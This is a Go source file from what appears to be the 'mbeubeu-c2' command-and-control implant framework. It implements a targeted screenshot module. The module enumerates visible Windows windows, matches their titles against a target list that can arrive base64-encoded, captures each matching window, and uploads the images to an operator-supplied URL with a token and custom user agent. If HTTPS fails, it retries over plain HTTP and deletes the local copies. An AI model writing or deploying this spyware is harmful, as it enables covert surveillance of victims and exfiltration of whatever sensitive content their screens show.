package enrif

import (
	"bufio"
	"encoding/base64"
	"fmt"
	"image/png"
	"os"
	"image"
	//"os/exec"
	"strings"
	"syscall"
	"time"
	"unsafe"

	"github.com/kbinani/screenshot"
	"golang.org/x/sys/windows"
	"mbeubeu-c2/src/run"
)

var (
	user32              = windows.NewLazySystemDLL("user32.dll")
	procEnumWindows     = user32.NewProc("EnumWindows")
	procGetWindowTextW  = user32.NewProc("GetWindowTextW")
	procIsWindowVisible = user32.NewProc("IsWindowVisible")
	procGetWindowRect   = user32.NewProc("GetWindowRect")
)

type Rect struct {
	Left   int32
	Top    int32
	Right  int32
	Bottom int32
}

func GetWindowRect(hwnd syscall.Handle) (Rect, error) {
	var rect Rect
	ret, _, err := procGetWindowRect.Call(
		uintptr(hwnd),
		uintptr(unsafe.Pointer(&rect)),
	)
	if ret == 0 {
		return rect, err
	}
	return rect, nil
}

func isWindowOpen(target string) (bool, Rect) {
	var found bool
	var windowRect Rect

	cb := syscall.NewCallback(func(hwnd syscall.Handle, lparam uintptr) uintptr {
		// Check if window is visible
		isVisible, _, _ := procIsWindowVisible.Call(uintptr(hwnd))
		if isVisible == 0 {
			return 1 // continue enumeration
		}

		// Get window title
		var buf [256]uint16
		procGetWindowTextW.Call(
			uintptr(hwnd),
			uintptr(unsafe.Pointer(&buf[0])),
			uintptr(len(buf)),
		)
		windowTitle := windows.UTF16ToString(buf[:])

		// Case-insensitive comparison
		if strings.Contains(strings.ToLower(windowTitle), strings.ToLower(target)) {
			rect, err := GetWindowRect(hwnd)
			if err != nil {
				return 1 // continue on error
			}
			
			// Found matching window
			windowRect = rect
			found = true
			return 0 // stop enumeration
		}
		return 1 // continue enumeration
	})

	procEnumWindows.Call(cb, 0)
	return found, windowRect
}

func SmartShot(titles []string, timeout int, url, uptoken, uagent string) string {
	const checkInterval = 3 * time.Second
	start := time.Now()
	uploadCount := 0

	for time.Since(start) < time.Duration(timeout)*time.Second {
		for _, title := range titles {
			title = strings.TrimSpace(title)
			if title == "" {
				continue
			}

			if found, rect := isWindowOpen(title); found {
				// Capture window region
				img, err := screenshot.CaptureRect(image.Rect(
					int(rect.Left),
					int(rect.Top),
					int(rect.Right),
					int(rect.Bottom),
				))
				if err != nil {
					continue
				}

				// Create temp file
				//tempFile, err := os.CreateTemp(os.TempDir(), fmt.Sprintf("%s_*.png", cleanFileName(title)))
				tempFile, err := os.CreateTemp("", fmt.Sprintf("%s_*.png", cleanFileName(title)))
				if err != nil {
					continue
				}
				defer tempFile.Close()
				defer os.Remove(tempFile.Name())

				// Save image
				if err := png.Encode(tempFile, img); err != nil {
					continue
				}
				
				// Attempt upload
				if err := uploadWithRetry(tempFile.Name(), url, uptoken, uagent); err == nil {
					uploadCount++
				}
			}
		}
		time.Sleep(checkInterval)
	}
	return fmt.Sprintf("Completed with %d successful uploads", uploadCount)
}

func cleanFileName(name string) string {
	return strings.Map(func(r rune) rune {
		if r == ' ' || r == ':' {
			return '_'
		}
		if ('a' <= r && r <= 'z') || ('A' <= r && r <= 'Z') || ('0' <= r && r <= '9') {
			return r
		}
		return -1
	}, name)
}

func uploadWithRetry(path, url, token, uagent string) error {
	if err := run.UploadFile(path, url, token, uagent); err != nil {
		// Retry with HTTP
		fallback := strings.Replace(url, "https://", "http://", 1)
		return run.UploadFile(path, fallback, token, uagent)
	}
	return nil
}

func LoadTitlesFromBase64(b64 string) ([]string, error) {
	decoded, err := base64.StdEncoding.DecodeString(b64)
	if err != nil {
		return nil, err
	}

	var titles []string
	scanner := bufio.NewScanner(strings.NewReader(string(decoded)))
	for scanner.Scan() {
		if title := strings.TrimSpace(scanner.Text()); title != "" {
			titles = append(titles, title)
		}
	}
	return titles, scanner.Err()
}
